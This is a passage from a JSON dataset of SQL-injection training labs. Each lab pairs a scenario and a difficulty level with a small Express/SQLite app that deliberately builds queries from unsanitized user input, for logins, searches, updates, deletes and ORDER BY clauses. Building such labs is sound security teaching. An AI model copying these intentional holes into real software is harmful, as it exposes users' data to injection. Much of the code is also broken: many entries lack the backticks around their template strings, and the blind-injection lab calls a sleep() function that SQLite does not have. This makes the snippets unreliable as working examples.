  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  // Vulnerable query allowing tautology injection\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in order search with unsanitized input",
  "Lab Description": "This lab simulates an order search endpoint vulnerable to SQL injection. The query is constructed by directly concatenating user input, allowing attackers to inject additional conditions to retrieve unintended data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, item TEXT, quantity INTEGER)\");\n  db.run(\"INSERT INTO orders (item, quantity) VALUES ('Laptop', 10)\");\n});\n\napp.get('/search', (req, res) => {\n  const item = req.query.item;\n  const query = SELECT * FROM orders WHERE item = '${item}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection via improper escaping of quotes",
  "Lab Description": "This lab demonstrates a vulnerability caused by improper escaping of quotes in SQL queries. User input containing quotes is not sanitized, allowing attackers to break out of the intended query structure.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT)\");\n  db.run(\"INSERT INTO products (name) VALUES ('Laptop')\");\n});\n\napp.post('/search', (req, res) => {\n  const name = req.body.name;\n  const query = \"SELECT * FROM products WHERE name = '\" + name + \"'\";\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in product search with concatenation error",
  "Lab Description": "This lab features a product search endpoint where user input is concatenated into the SQL query without proper sanitization. This vulnerability allows attackers to append additional SQL commands to retrieve extra data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL)\");\n  db.run(\"INSERT INTO products (name, price) VALUES ('Smartphone', 800)\");\n});\n\napp.post('/search', (req, res) => {\n  const product = req.body.product;\n  const query = SELECT * FROM products WHERE name = '${product}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in comment system due to weak sanitization",
  "Lab Description": "This lab simulates a comment submission system that directly incorporates user comments into SQL queries without proper sanitization. Attackers can inject SQL to manipulate or extract data from the comments table.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE comments (id INTEGER PRIMARY KEY, content TEXT)\");\n  db.run(\"INSERT INTO comments (content) VALUES ('Nice product!')\");\n});\n\napp.post('/comment', (req, res) => {\n  const comment = req.body.comment;\n  const query = INSERT INTO comments (content) VALUES ('${comment}');\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred.');\n    else res.send('Comment submitted.');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection using OR conditions in search functionality",
  "Lab Description": "This lab demonstrates a vulnerability in a search endpoint where attackers inject OR conditions into the SQL query. This allows them to bypass filters and retrieve unauthorized data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE employees (id INTEGER PRIMARY KEY, name TEXT, department TEXT)\");\n  db.run(\"INSERT INTO employees (name, department) VALUES ('Alice', 'HR')\");\n});\n\napp.get('/search', (req, res) => {\n  const name = req.query.name;\n  const query = SELECT * FROM employees WHERE name = '${name}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in order update with unsanitized parameters",
  "Lab Description": "This lab simulates an update operation on an orders table where unsanitized user input is directly concatenated into the SQL query. This vulnerability can allow attackers to alter order data without authorization.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, product TEXT, quantity INTEGER)\");\n  db.run(\"INSERT INTO orders (product, quantity) VALUES ('Tablet', 30)\");\n});\n\napp.post('/updateOrder', (req, res) => {\n  const product = req.body.product;\n  const newQuantity = req.body.newQuantity;\n  const query = UPDATE orders SET quantity = ${newQuantity} WHERE product = '${product}';\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred.');\n    else res.send(Order updated for ${product});\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection through stored procedure simulation with unsanitized input",
  "Lab Description": "This lab simulates a scenario where unsanitized input is used to construct a dynamic stored procedure call, resulting in SQL injection. Exploit this vulnerability to alter the behavior of the stored procedure simulation.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "// Note: SQLite does not support stored procedures, so we simulate the behavior\nconst express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, item TEXT, quantity INTEGER)\");\n  db.run(\"INSERT INTO orders (item, quantity) VALUES ('Monitor', 5)\");\n});\n\napp.post('/updateOrder', (req, res) => {\n  const newQuantity = req.body.quantity;\n  // Simulated stored procedure call vulnerable to SQL injection\n  const query = UPDATE orders SET quantity = ${newQuantity} WHERE id = 1;\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred.');\n    else res.send(Order updated. Changes: ${this.changes});\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection using parameter tampering in a financial application",
  "Lab Description": "This lab simulates a financial application where user input is unsanitized in SQL queries. Attackers can tamper with parameters to manipulate account balances and retrieve confidential information.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE accounts (id INTEGER PRIMARY KEY, username TEXT, balance REAL)\");\n  db.run(\"INSERT INTO accounts (username, balance) VALUES ('user1', 1000.00)\");\n  db.run(\"INSERT INTO accounts (username, balance) VALUES ('admin', 5000.00)\");\n});\n\napp.post('/transfer', (req, res) => {\n  const username = req.body.username;\n  const amount = req.body.amount;\n  const query = UPDATE accounts SET balance = balance - ${amount} WHERE username = '${username}';\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred.');\n    else res.send('Transfer executed.');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in user registration form",
  "Lab Description": "This lab involves a user registration form where the input is directly inserted into an SQL INSERT statement. The lack of proper sanitization allows an attacker to inject malicious SQL commands to manipulate the user table.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n});\n\napp.post('/register', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = INSERT INTO users (username, password) VALUES ('${username}', '${password}');\n  console.log('Executing query:', query);\n  db.run(query, function(err) {\n    if (err) res.status(500).send('Error occurred.');\n    else res.send('Registration successful.');\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection with hidden field manipulation in e-commerce checkout",
  "Lab Description": "This lab simulates an e-commerce checkout process where a hidden field is used in an SQL query without validation. Attackers can manipulate the hidden field to inject SQL commands and alter order data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: false }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE orders (id INTEGER PRIMARY KEY, item TEXT, quantity INTEGER)\");\n  db.run(\"INSERT INTO orders (item, quantity) VALUES ('Camera', 15)\");\n});\n\napp.post('/checkout', (req, res) => {\n  const hiddenField = req.body.hiddenField;\n  const query = SELECT * FROM orders WHERE item = '${hiddenField}';\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred.');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection with URL encoding bypass",
  "Lab Description": "This lab simulates a SQL injection vulnerability in a login form where user inputs are URL encoded before processing. Error messages reveal details of the underlying database. Exploit the vulnerability by crafting URL-encoded payloads to extract sensitive user data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user', 'userpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else if (rows.length > 0) {\n      res.send(\"Login successful\");\n    } else {\n      res.send(\"Login failed\");\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "Blind SQL injection with delay-based response",
  "Lab Description": "This lab demonstrates a blind SQL injection vulnerability where response time delays are used to infer database content. Manipulate the SQL query to induce a delay when conditions are met, allowing extraction of sensitive data based on timing differences.",
  "Vulnerability name": "Blind SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('user', 'userpass')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT username, password, CASE WHEN (username='${username}' AND password='${password}') THEN (SELECT sleep(5)) ELSE 0 END as delay FROM users;;\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else {\n      const delay = rows[0].delay;\n      if (delay >= 5) {\n        res.send(\"Vulnerability exploited: Blind SQL Injection detected.\");\n      } else {\n        res.send(\"No vulnerability exploited.\");\n      }\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection using UNION attack for data retrieval",
  "Lab Description": "This lab features an application that directly concatenates user input into an SQL query. By using a UNION attack, you can merge results from the main query with those from a secondary query to retrieve data from the 'customers' table.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\n\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users (username, password) VALUES ('admin', 'adminpass')\");\n  db.run(\"CREATE TABLE customers (id INTEGER PRIMARY KEY, name TEXT, email TEXT)\");\n  db.run(\"INSERT INTO customers (name, email) VALUES ('John Doe', 'john@example.com')\");\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  const query = SELECT * FROM users WHERE username = '${username}' AND password = '${password}';\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error occurred.\");\n    } else if (rows.length > 0) {\n      // Attacker uses UNION to extract data from customers table\n      const unionQuery = query + \" UNION SELECT null, name, email FROM customers\";\n      db.all(unionQuery, [], (err, unionRows) => {\n        if (err) {\n          res.status(500).send(\"Error during UNION attack.\");\n        } else {\n          res.json(unionRows);\n        }\n      });\n    } else {\n      res.send(\"Login failed\");\n    }\n  });\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => {\n  console.log(Lab running on http://localhost:${PORT});\n});"
},
{
  "Lab scenario": "SQL injection in blog comment sorting",
  "Lab Description": "A blog platform sorts comments based on a user-specified column. The ORDER BY clause is constructed with unsanitized input, allowing an attacker to inject SQL to manipulate the sorting order and potentially leak data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE comments (id INTEGER PRIMARY KEY, author TEXT, comment TEXT)\");\n  db.run(\"INSERT INTO comments (author, comment) VALUES ('Alice', 'Great post!')\");\n});\n\napp.get('/comments', (req, res) => {\n  const sortColumn = req.query.sort;\n  const query = `SELECT * FROM comments ORDER BY ${sortColumn}`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in product discount retrieval",
  "Lab Description": "An e-commerce site retrieves discount information by concatenating a coupon code into an SQL query. Attackers can inject SQL into the coupon parameter to retrieve unauthorized discount data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE discounts (id INTEGER PRIMARY KEY, code TEXT, value INTEGER)\");\n  db.run(\"INSERT INTO discounts (code, value) VALUES ('SAVE20', 20)\");\n});\n\napp.get('/discount', (req, res) => {\n  const coupon = req.query.coupon;\n  const query = `SELECT * FROM discounts WHERE code = '${coupon}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in news article categorization",
  "Lab Description": "A news categorization system accepts a category from the user and builds an SQL query without sanitization. Attackers can inject SQL to retrieve articles from any category.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE articles (id INTEGER PRIMARY KEY, category TEXT, content TEXT)\");\n  db.run(\"INSERT INTO articles (category, content) VALUES ('sports', 'Sports news content')\");\n});\n\napp.get('/articles', (req, res) => {\n  const category = req.query.category;\n  const query = `SELECT * FROM articles WHERE category = '${category}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in event booking cancellation",
  "Lab Description": "An event booking system allows users to cancel bookings by providing a booking ID. The unsanitized input in the cancellation query allows attackers to cancel bookings they do not own.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE bookings (id INTEGER PRIMARY KEY, event TEXT, user TEXT)\");\n  db.run(\"INSERT INTO bookings (event, user) VALUES ('Concert', 'alice')\");\n});\n\napp.post('/cancelBooking', (req, res) => {\n  const bookingId = req.body.bookingId;\n  const query = `DELETE FROM bookings WHERE id = '${bookingId}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Booking cancelled');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in user analytics query",
  "Lab Description": "An analytics endpoint retrieves user metrics based on a parameter provided by the user. Unsanitized input allows attackers to inject SQL to retrieve data for all users.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE analytics (id INTEGER PRIMARY KEY, metric TEXT, value REAL)\");\n  db.run(\"INSERT INTO analytics (metric, value) VALUES ('loginCount', 150)\");\n});\n\napp.post('/analytics', (req, res) => {\n  const metric = req.body.metric;\n  const query = `SELECT * FROM analytics WHERE metric = '${metric}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in hotel room availability check",
  "Lab Description": "A hotel booking system checks room availability by directly concatenating a room type into the SQL query. Attackers can inject SQL to view all available rooms regardless of type.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Easy",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE rooms (id INTEGER PRIMARY KEY, room_type TEXT, available INTEGER)\");\n  db.run(\"INSERT INTO rooms (room_type, available) VALUES ('Suite', 5)\");\n});\n\napp.get('/rooms', (req, res) => {\n  const roomType = req.query.roomType;\n  const query = `SELECT * FROM rooms WHERE room_type = '${roomType}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in library management search",
  "Lab Description": "A library system searches for books using a user-supplied keyword. The unsanitized keyword in the LIKE clause allows an attacker to inject SQL to retrieve all book records.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE books (id INTEGER PRIMARY KEY, title TEXT, author TEXT)\");\n  db.run(\"INSERT INTO books (title, author) VALUES ('Secret History', 'D. Brown')\");\n});\n\napp.get('/searchBooks', (req, res) => {\n  const keyword = req.query.keyword;\n  const query = `SELECT * FROM books WHERE title LIKE '%${keyword}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in financial transaction audit",
  "Lab Description": "A financial auditing system retrieves transaction records based on user-provided transaction IDs. Unsanitized input allows an attacker to inject SQL and access or modify sensitive financial data.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE transactions (id INTEGER PRIMARY KEY, details TEXT, amount REAL)\");\n  db.run(\"INSERT INTO transactions (details, amount) VALUES ('Payment received', 250.00)\");\n});\n\napp.post('/audit', (req, res) => {\n  const txnId = req.body.txnId;\n  const query = `SELECT * FROM transactions WHERE id = '${txnId}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in admin panel data export",
  "Lab Description": "An admin panel provides a data export feature that constructs SQL queries unsafely from user input. Attackers can inject SQL to export data from other tables.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE exportData (id INTEGER PRIMARY KEY, info TEXT)\");\n  db.run(\"INSERT INTO exportData (info) VALUES ('Confidential Data')\");\n});\n\napp.post('/exportData', (req, res) => {\n  const filter = req.body.filter;\n  const query = `SELECT * FROM exportData WHERE info LIKE '%${filter}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in mobile app crash reporting",
  "Lab Description": "A mobile app crash reporting endpoint concatenates error messages into SQL queries without sanitization. Attackers can inject SQL to retrieve detailed crash logs.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE crash_logs (id INTEGER PRIMARY KEY, error_message TEXT)\");\n  db.run(\"INSERT INTO crash_logs (error_message) VALUES ('Null pointer exception')\");\n});\n\napp.post('/reportCrash', (req, res) => {\n  const errorMsg = req.body.errorMsg;\n  const query = `SELECT * FROM crash_logs WHERE error_message = '${errorMsg}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in e-commerce wishlist retrieval",
  "Lab Description": "An e-commerce site's wishlist feature retrieves user wishlists using unsanitized wishlist IDs, allowing attackers to inject SQL and view wishlists for other users.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE wishlists (id INTEGER PRIMARY KEY, user TEXT, item TEXT)\");\n  db.run(\"INSERT INTO wishlists (user, item) VALUES ('user1', 'Smartwatch')\");\n});\n\napp.get('/wishlist', (req, res) => {\n  const wishlistId = req.query.id;\n  const query = `SELECT * FROM wishlists WHERE id = '${wishlistId}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in social media friend suggestion",
  "Lab Description": "A social network\u2019s friend suggestion feature uses unsanitized input to filter suggestions. Attackers can inject SQL to retrieve hidden friend lists.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, hidden INTEGER)\");\n  db.run(\"INSERT INTO users (name, hidden) VALUES ('Alice', 0)\");\n  db.run(\"INSERT INTO users (name, hidden) VALUES ('Eve', 1)\");\n});\n\napp.get('/friendSuggestions', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT * FROM users WHERE name LIKE '%${filter}%'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in survey analytics dashboard",
  "Lab Description": "A survey dashboard constructs queries from user filters without sanitization, allowing attackers to inject SQL and alter the reported survey results.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Medium",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE surveys (id INTEGER PRIMARY KEY, category TEXT, response TEXT)\");\n  db.run(\"INSERT INTO surveys (category, response) VALUES ('satisfaction', 'Good')\");\n});\n\napp.post('/surveyDashboard', (req, res) => {\n  const category = req.body.category;\n  const query = `SELECT * FROM surveys WHERE category = '${category}'`;\n  console.log('Executing query:', query);\n  db.all(query, [], (err, rows) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.json(rows);\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
  "Lab scenario": "SQL injection in restaurant reservation system",
  "Lab Description": "A restaurant reservation endpoint uses unsanitized table identifiers to build SQL queries. Attackers can inject SQL to reserve tables without authorization.",
  "Vulnerability name": "SQL Injection",
  "lab level": "Hard",
  "src code": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE reservations (id INTEGER PRIMARY KEY, table_number TEXT, reserved INTEGER)\");\n  db.run(\"INSERT INTO reservations (table_number, reserved) VALUES ('T1', 0)\");\n});\n\napp.post('/reserve', (req, res) => {\n  const table = req.body.table_number;\n  const query = `UPDATE reservations SET reserved = 1 WHERE table_number = '${table}'`;\n  console.log('Executing query:', query);\n  db.run(query, (err) => {\n    if (err) res.status(500).send('Error occurred');\n    else res.send('Table reserved');\n  });\n});\n\napp.listen(3000, () => console.log('Server running on http://localhost:3000'));"
},
{
